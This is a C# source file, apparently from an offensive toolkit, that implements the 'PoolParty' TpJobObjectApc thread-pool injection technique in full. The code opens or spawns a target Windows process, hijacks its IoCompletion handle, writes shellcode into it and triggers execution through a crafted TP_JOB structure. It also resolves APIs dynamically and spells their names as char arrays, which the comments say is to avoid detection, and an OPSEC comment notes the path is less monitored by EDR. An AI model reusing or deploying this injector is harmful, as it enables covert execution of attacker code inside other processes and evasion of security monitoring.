// PoolParty – TpJobObjectApc / RemoteTpJobDirectInsertion
//
// Credits: SafeBreach Labs, Alon Leviev (@_0xDeku)
// Black Hat Europe 2023: "PoolParty - A New Set of Windows Thread Pool Injection Techniques"
//
// Technique
// ---------
// 1. Create (or open) target process; resume its main thread so the Windows
//    thread pool initialises.
// 2. Enumerate the target's handle table via NtQueryInformationProcess
//    (ProcessHandleInformation) looking for an IoCompletion object.
// 3. Duplicate that handle into our process.
// 4. Allocate RW memory in the target; write shellcode; flip to RX.
// 5. Allocate RW memory for a TP_JOB structure (96 bytes on x64).
//    Set Callback at offset 0x50 = shellcode address; zero everything else.
// 6. ZwSetIoCompletion(
//        IoCompletion,
//        KeyContext  = &remote_tp_job,
//        ApcContext  = JOB_OBJECT_MSG_ACTIVE_PROCESS_LIMIT (3),  ← non-NULL triggers TpJobNotifications
//        IoStatus    = 0,
//        IoStatusInfo = 0)
// 7. A thread pool worker dequeues the packet; the non-NULL ApcContext routes
//    dispatch through TpJobNotifications which calls TP_JOB.Callback.
//
// OPSEC: no new thread, existing worker executes shellcode via job-notification
// path (less monitored than TP_DIRECT in EDR hooks).

using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Text;

namespace Erebus.ClickOnce.Injections
{
    [SupportedOSPlatform("windows")]
    public class TpJobObjectApcInjection : IInjectionMethod
    {
        private const uint MEM_COMMIT              = 0x1000;
        private const uint MEM_RESERVE             = 0x2000;
        private const uint PAGE_EXECUTE_READ       = 0x20;
        private const uint PAGE_READWRITE          = 0x04;
        private const uint PROCESS_ALL_ACCESS      = 0x1F0FFF;
        private const uint THREAD_ALL_ACCESS       = 0x1F03FF;
        private const uint IO_COMPLETION_ALL_ACCESS = 0x001F0003;
        private const int  JOB_OBJECT_MSG_ACTIVE_PROCESS_LIMIT = 3;

        // TP_JOB is 0x60 bytes on x64.  Callback pointer lives at offset 0x50.
        private const int TP_JOB_SIZE             = 0x60;
        private const int TP_JOB_CALLBACK_OFFSET  = 0x50;

        public string Description => "PoolParty TpJobObjectApc (RemoteTpJobDirectInsertion) – executes shellcode via thread pool job-notification dispatch path";
        public string Name        => "TpJobObjectApc";

        public bool Inject(byte[] shellcode, int targetPid = 0)
        {
            IntPtr hProcess       = IntPtr.Zero;
            IntPtr hThread        = IntPtr.Zero;
            IntPtr hIoCompletion  = IntPtr.Zero;

            try
            {
                int  pid      = 0;
                uint threadId = 0;

                if (targetPid == 0)
                {
                    DebugLogger.WriteLine("[*] Creating suspended target process...");
                    Win32.STARTUPINFO si = new Win32.STARTUPINFO();
                    si.cb = Marshal.SizeOf(si);
                    Win32.PROCESS_INFORMATION pi;

                    bool ok = Win32.CreateProcess(
                        null!, new StringBuilder(InjectionConfig.TargetProcess),
                        IntPtr.Zero, IntPtr.Zero, false,
                        Win32.CREATION_FLAGS.CREATE_SUSPENDED | Win32.CREATION_FLAGS.CREATE_NO_WINDOW,
                        IntPtr.Zero, null!, ref si, out pi);

                    if (!ok)
                    {
                        DebugLogger.WriteLine($"[-] CreateProcess failed: {Marshal.GetLastWin32Error()}");
                        return false;
                    }
                    hProcess  = pi.hProcess;
                    hThread   = pi.hThread;
                    pid       = pi.dwProcessId;
                    threadId  = (uint)pi.dwThreadId;
                    DebugLogger.WriteLine($"[+] Target process PID={pid} TID={threadId}");
                }
                else
                {
                    DebugLogger.WriteLine($"[*] Opening PID {targetPid}...");
                    hProcess = DoOpenProcK(PROCESS_ALL_ACCESS, false, targetPid);
                    if (hProcess == IntPtr.Zero)
                    {
                        DebugLogger.WriteLine($"[-] OpenProcess failed: {Marshal.GetLastWin32Error()}");
                        return false;
                    }
                    Process proc = Process.GetProcessById(targetPid);
                    threadId = proc.Threads.Count > 0 ? (uint)proc.Threads[0].Id : 0;
                    if (threadId != 0)
                        hThread = DoOpenThread(THREAD_ALL_ACCESS, false, threadId);
                    pid = targetPid;
                }

                // Step 1: Resume the thread so the thread pool can initialise.
                if (hThread != IntPtr.Zero)
                {
                    uint suspendCount;
                    uint st = DoResume(hThread, out suspendCount);
                    if (st == 0)
                        DebugLogger.WriteLine($"[+] Thread resumed (prev suspend={suspendCount})");
                }

                // Step 2: Wait for the thread pool to initialise (IoCompletion handle
                //         appears in the target's handle table).
                DebugLogger.WriteLine("[*] Waiting for thread pool to initialise...");
                for (int attempt = 1; attempt <= 10; attempt++)
                {
                    System.Threading.Thread.Sleep(500);
                    hIoCompletion = FindIoCompletionHandle(hProcess);
                    if (hIoCompletion != IntPtr.Zero)
                        break;
                    if (attempt < 10)
                        DebugLogger.WriteLine($"    Retry {attempt}/10...");
                }
                if (hIoCompletion == IntPtr.Zero)
                {
                    DebugLogger.WriteLine("[-] Could not find IoCompletion handle – target has no thread pool");
                    return false;
                }
                DebugLogger.WriteLine($"[+] Duplicated IoCompletion handle: 0x{hIoCompletion:X}");

                // Step 3: Allocate RW, write shellcode, flip to RX.
                IntPtr shellcodeBase  = IntPtr.Zero;
                IntPtr shellcodeSize  = new IntPtr(shellcode.Length);
                uint status = DoAlloc(hProcess, ref shellcodeBase, IntPtr.Zero,
                                      ref shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                if (status != 0)
                {
                    DebugLogger.WriteLine($"[-] Alloc shellcode failed: 0x{status:X}");
                    return false;
                }

                uint written;
                status = DoWrite(hProcess, shellcodeBase, shellcode, (uint)shellcode.Length, out written);
                if (status != 0)
                {
                    DebugLogger.WriteLine($"[-] Write shellcode failed: 0x{status:X}");
                    return false;
                }

                IntPtr protBase = shellcodeBase;
                IntPtr protSize = new IntPtr(shellcode.Length);
                uint   oldProt;
                status = DoProtect(hProcess, ref protBase, ref protSize, PAGE_EXECUTE_READ, out oldProt);
                if (status != 0)
                {
                    DebugLogger.WriteLine($"[-] Protect RX failed: 0x{status:X}");
                    return false;
                }
                DebugLogger.WriteLine($"[+] Shellcode at 0x{shellcodeBase:X} ({shellcode.Length} bytes, RX)");

                // Step 4: Build and write TP_JOB.
                byte[]  tpJob     = new byte[TP_JOB_SIZE];
                byte[]  cbBytes   = BitConverter.GetBytes(shellcodeBase.ToInt64());
                Array.Copy(cbBytes, 0, tpJob, TP_JOB_CALLBACK_OFFSET, cbBytes.Length);

                IntPtr tpJobBase = IntPtr.Zero;
                IntPtr tpJobSize = new IntPtr(TP_JOB_SIZE);
                status = DoAlloc(hProcess, ref tpJobBase, IntPtr.Zero,
                                 ref tpJobSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                if (status != 0)
                {
                    DebugLogger.WriteLine($"[-] Alloc TP_JOB failed: 0x{status:X}");
                    return false;
                }

                status = DoWrite(hProcess, tpJobBase, tpJob, (uint)TP_JOB_SIZE, out written);
                if (status != 0)
                {
                    DebugLogger.WriteLine($"[-] Write TP_JOB failed: 0x{status:X}");
                    return false;
                }
                DebugLogger.WriteLine($"[+] TP_JOB at 0x{tpJobBase:X} (Callback@+0x50=0x{shellcodeBase:X})");

                // Step 5: Queue the completion packet.
                // ApcContext = JOB_OBJECT_MSG_ACTIVE_PROCESS_LIMIT (3) routes the
                // dequeued packet through TpJobNotifications → calls TP_JOB.Callback.
                status = DoSetIoCompletion(
                    hIoCompletion,
                    tpJobBase,                                      // KeyContext
                    new IntPtr(JOB_OBJECT_MSG_ACTIVE_PROCESS_LIMIT), // ApcContext != NULL → TP_JOB path
                    0,                                               // IoStatus
                    UIntPtr.Zero);                                   // IoStatusInfo
                if (status != 0)
                {
                    DebugLogger.WriteLine($"[-] ZwSetIoCompletion failed: 0x{status:X}");
                    return false;
                }

                DebugLogger.WriteLine("[+] Packet queued – shellcode will execute via TpJobNotifications");
                System.Threading.Thread.Sleep(2000);
                return true;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] TpJobObjectApc injection failed: {ex.Message}");
                return false;
            }
            finally
            {
                if (hIoCompletion != IntPtr.Zero) DoClose(hIoCompletion);
                if (hThread       != IntPtr.Zero) DoClose(hThread);
                if (hProcess      != IntPtr.Zero) DoClose(hProcess);
            }
        }

        // ----------------------------------------------------------------
        // Handle enumeration – find IoCompletion in the target's table
        // ----------------------------------------------------------------

        private IntPtr FindIoCompletionHandle(IntPtr hProcess)
        {
            // Query ProcessHandleInformation (0x33) to get the handle table.
            const uint ProcessHandleInformation = 0x33;
            uint bufferSize = 0x10000;
            byte[]? buffer  = null;
            uint status;
            uint returnLen  = 0;

            do
            {
                buffer = new byte[bufferSize];
                GCHandle pin = GCHandle.Alloc(buffer, GCHandleType.Pinned);
                try
                {
                    status = DoQueryInfoProcess(hProcess, ProcessHandleInformation,
                                               pin.AddrOfPinnedObject(), bufferSize,
                                               out returnLen);
                }
                finally { pin.Free(); }

                if (status == 0x80000005 /* STATUS_INFO_LENGTH_MISMATCH */ ||
                    status == 0xC0000004)
                    bufferSize = returnLen + 0x1000;
            }
            while (status == 0x80000005 || status == 0xC0000004);

            if (status != 0 || buffer == null) return IntPtr.Zero;

            // Layout: ULONG_PTR NumberOfHandles, ULONG_PTR Reserved,
            //         then array of PROCESS_HANDLE_TABLE_ENTRY_INFO (7×8 = 56 bytes each on x64)
            int offset = 16; // skip two ULONG_PTRs
            ulong count = BitConverter.ToUInt64(buffer, 0);

            for (ulong i = 0; i < count; i++)
            {
                if (offset + 56 > buffer.Length) break;
                IntPtr handleValue = new IntPtr(BitConverter.ToInt64(buffer, offset));
                offset += 56;

                // Duplicate the handle into our process.
                IntPtr hDup   = IntPtr.Zero;
                uint   dupSt  = DoDuplicateObject(
                    hProcess, handleValue,
                    Process.GetCurrentProcess().Handle, ref hDup,
                    IO_COMPLETION_ALL_ACCESS, 0, 0);
                if (dupSt != 0 || hDup == IntPtr.Zero) continue;

                // Query its type name.
                byte[]  typeInfo   = new byte[512];
                GCHandle typePin   = GCHandle.Alloc(typeInfo, GCHandleType.Pinned);
                uint queryStatus;
                try
                {
                    queryStatus = DoQueryObject(hDup, 2 /* ObjectTypeInformation */,
                                               typePin.AddrOfPinnedObject(),
                                               (uint)typeInfo.Length, out uint _);
                }
                finally { typePin.Free(); }

                if (queryStatus != 0) { DoClose(hDup); continue; }

                // UNICODE_STRING at offset 0: Length(2), MaxLen(2), [pad4], Buffer(8)
                // Buffer points to the type name wide string.
                // On x64 the Buffer pointer is at offset 8 (after Length+MaxLen+padding).
                IntPtr namePtr = new IntPtr(BitConverter.ToInt64(typeInfo, 8));
                if (namePtr == IntPtr.Zero) { DoClose(hDup); continue; }

                ushort length = BitConverter.ToUInt16(typeInfo, 0);
                if (length == 0 || length > 256) { DoClose(hDup); continue; }

                try
                {
                    string typeName = Marshal.PtrToStringUni(namePtr, length / 2);
                    if (typeName == "IoCompletion")
                        return hDup; // caller takes ownership; do NOT close here
                }
                catch { }

                DoClose(hDup);
            }
            return IntPtr.Zero;
        }

        // ----------------------------------------------------------------
        // NT function delegates (char-array names to avoid string literals)
        // ----------------------------------------------------------------

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate uint FnAvm(IntPtr Process, ref IntPtr Base, IntPtr Zeros,
                                    ref IntPtr Size, uint AllocType, uint Protect);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate uint FnCl(IntPtr Handle);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate uint FnDo(IntPtr SourceProcess, IntPtr SourceHandle,
                                   IntPtr TargetProcess, ref IntPtr TargetHandle,
                                   uint DesiredAccess, uint HandleAttributes, uint Options);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate uint FnPvm(IntPtr Process, ref IntPtr Base, ref IntPtr Size,
                                    uint NewProtect, out uint OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate uint FnQip(IntPtr Process, uint InfoClass, IntPtr Info,
                                    uint InfoLen, out uint ReturnLen);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate uint FnQo(IntPtr Handle, uint InfoClass, IntPtr Info,
                                   uint InfoLen, out uint ReturnLen);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate uint FnRt(IntPtr Thread, out uint SuspendCount);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate uint FnSic(IntPtr IoCompletion, IntPtr KeyContext,
                                    IntPtr ApcContext, uint IoStatus,
                                    UIntPtr IoStatusInfo);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate uint FnWvm(IntPtr Process, IntPtr Base, byte[] Buffer,
                                    uint Length, out uint Written);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate IntPtr FnOp(uint Access, bool Inherit, int Pid);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate IntPtr FnOt(uint Access, bool Inherit, uint Tid);

        private static readonly Lazy<FnAvm> _ntAlloc =
            Evasion.DynamicApi.LazyDelegate<FnAvm>(Evasion.DynamicApi.Ntdll,
                new[] { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y' });

        private static readonly Lazy<FnCl> _ntClose =
            Evasion.DynamicApi.LazyDelegate<FnCl>(Evasion.DynamicApi.Ntdll,
                new[] { 'N','t','C','l','o','s','e' });

        private static readonly Lazy<FnDo> _ntDupObj =
            Evasion.DynamicApi.LazyDelegate<FnDo>(Evasion.DynamicApi.Ntdll,
                new[] { 'N','t','D','u','p','l','i','c','a','t','e','O','b','j','e','c','t' });

        private static readonly Lazy<FnPvm> _ntProtect =
            Evasion.DynamicApi.LazyDelegate<FnPvm>(Evasion.DynamicApi.Ntdll,
                new[] { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y' });

        private static readonly Lazy<FnQip> _ntQip =
            Evasion.DynamicApi.LazyDelegate<FnQip>(Evasion.DynamicApi.Ntdll,
                new[] { 'N','t','Q','u','e','r','y','I','n','f','o','r','m','a','t','i','o','n','P','r','o','c','e','s','s' });

        private static readonly Lazy<FnQo> _ntQobj =
            Evasion.DynamicApi.LazyDelegate<FnQo>(Evasion.DynamicApi.Ntdll,
                new[] { 'N','t','Q','u','e','r','y','O','b','j','e','c','t' });

        private static readonly Lazy<FnRt> _ntResume =
            Evasion.DynamicApi.LazyDelegate<FnRt>(Evasion.DynamicApi.Ntdll,
                new[] { 'N','t','R','e','s','u','m','e','T','h','r','e','a','d' });

        // ZwSetIoCompletion and NtSetIoCompletion are the same syscall.
        private static readonly Lazy<FnSic> _zwSetIoCompletion =
            Evasion.DynamicApi.LazyDelegate<FnSic>(Evasion.DynamicApi.Ntdll,
                new[] { 'Z','w','S','e','t','I','o','C','o','m','p','l','e','t','i','o','n' });

        private static readonly Lazy<FnWvm> _ntWrite =
            Evasion.DynamicApi.LazyDelegate<FnWvm>(Evasion.DynamicApi.Ntdll,
                new[] { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y' });

        private static readonly Lazy<FnOp> _openProc =
            Evasion.DynamicApi.LazyDelegate<FnOp>(Evasion.DynamicApi.Kernel32,
                new[] { 'O','p','e','n','P','r','o','c','e','s','s' });

        private static readonly Lazy<FnOt> _openThread =
            Evasion.DynamicApi.LazyDelegate<FnOt>(Evasion.DynamicApi.Kernel32,
                new[] { 'O','p','e','n','T','h','r','e','a','d' });

        private static uint DoAlloc(IntPtr p, ref IntPtr b, IntPtr z, ref IntPtr r, uint a, uint pr)
            => _ntAlloc.Value(p, ref b, z, ref r, a, pr);
        private static uint DoClose(IntPtr h)
            => _ntClose.Value(h);
        private static uint DoDuplicateObject(IntPtr sp, IntPtr sh, IntPtr tp, ref IntPtr th,
                                              uint da, uint ha, uint opts)
            => _ntDupObj.Value(sp, sh, tp, ref th, da, ha, opts);
        private static uint DoProtect(IntPtr p, ref IntPtr b, ref IntPtr r, uint n, out uint o)
            => _ntProtect.Value(p, ref b, ref r, n, out o);
        private static uint DoQueryInfoProcess(IntPtr p, uint ic, IntPtr info, uint len, out uint ret)
            => _ntQip.Value(p, ic, info, len, out ret);
        private static uint DoQueryObject(IntPtr h, uint ic, IntPtr info, uint len, out uint ret)
            => _ntQobj.Value(h, ic, info, len, out ret);
        private static uint DoResume(IntPtr t, out uint s)
            => _ntResume.Value(t, out s);
        private static uint DoSetIoCompletion(IntPtr io, IntPtr key, IntPtr apc, uint ioStatus, UIntPtr ioInfo)
            => _zwSetIoCompletion.Value(io, key, apc, ioStatus, ioInfo);
        private static uint DoWrite(IntPtr p, IntPtr b, byte[] buf, uint len, out uint w)
            => _ntWrite.Value(p, b, buf, len, out w);
        private static IntPtr DoOpenProcK(uint a, bool b, int c)
            => _openProc.Value(a, b, c);
        private static IntPtr DoOpenThread(uint a, bool b, uint c)
            => _openThread.Value(a, b, c);
    }
}
